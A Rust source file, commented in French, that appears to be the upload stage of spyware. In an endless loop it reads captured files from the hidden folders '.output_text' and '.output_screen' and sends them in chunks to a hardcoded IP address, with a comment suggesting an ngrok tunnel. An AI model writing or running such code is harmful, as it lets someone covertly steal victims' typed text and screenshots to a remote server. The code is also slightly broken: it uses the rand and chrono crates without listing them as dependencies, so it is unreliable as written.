// Cargo.toml
// [package]
// name = "chunked_sender"
// version = "0.1.0"
// edition = "2021"
//
// [dependencies]
// reqwest = { version = "0.11", features = ["blocking"] }
// anyhow = "1.0"

use anyhow::Result;
use std::io::Write;
use rand::{thread_rng, Rng};
use reqwest::blocking::Client;
use std::{
    fs::{self, File},
    io::Read,
    path::Path,
    thread,
    time::Duration,
};


const SERVER_URL: &str = "http://144.172.84.133:8080"; // 👉 change à ton URL/ngrok
const CHUNK_SIZE: usize = 1024 * 1024; // 1 Mo

fn send_file_in_chunks(client: &Client, file_path: &Path, file_type: &str) -> Result<()> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let total_chunks = (buffer.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let filename = file_path.file_name().unwrap().to_string_lossy();

    for idx in 0..total_chunks {
        let start = idx * CHUNK_SIZE;
        let end = (start + CHUNK_SIZE).min(buffer.len());
        let chunk = &buffer[start..end];

        let resp = client
            .post(SERVER_URL)
            .header("X-Filename", filename.to_string())
            .header("X-File-Type", file_type) // Ajouter le type de fichier
            .header("X-Segment-Number", idx.to_string())
            .header("X-Total-Segments", total_chunks.to_string())
            .body(chunk.to_vec())
            .send()?;

        if resp.status().is_success() {
            println!("✔️  Chunk {}/{} envoyé pour {}", idx + 1, total_chunks, filename);
        } else {
            eprintln!("❌  Erreur chunk {}/{}: {}", idx + 1, total_chunks, resp.status());
        }

        // petite pause pour ne pas spammer
        thread::sleep(Duration::from_millis(200));
    }

    Ok(())
}

fn send_dir(dir: &str) -> Result<()> {
    let entries = fs::read_dir(dir)?;
    let client = Client::new();

    for entry in entries {
        let path = entry?.path();
        if path.is_file() {
            let file_type = if path.to_str().unwrap().contains("output_text") {
                "output_text"
            } else {
                "output_screen"
            };
            send_file_in_chunks(&client, &path, file_type)?;
        }
    }

    Ok(())
}

fn main() -> Result<()> {
    let output_text_dir = ".output_text";
    let output_screen_dir = ".output_screen";

    loop {
        println!("🚀 Démarrage d'un nouvel envoi à {:?}", chrono::Local::now());

        if let Err(e) = send_dir(output_text_dir) {
            eprintln!("⚠️  Erreur d'envoi : {:?}", e);
        }

        if let Err(e) = send_dir(output_screen_dir) {
            eprintln!("⚠️  Erreur d'envoi : {:?}", e);
        }

        thread::sleep(Duration::from_secs(5));
    }
}
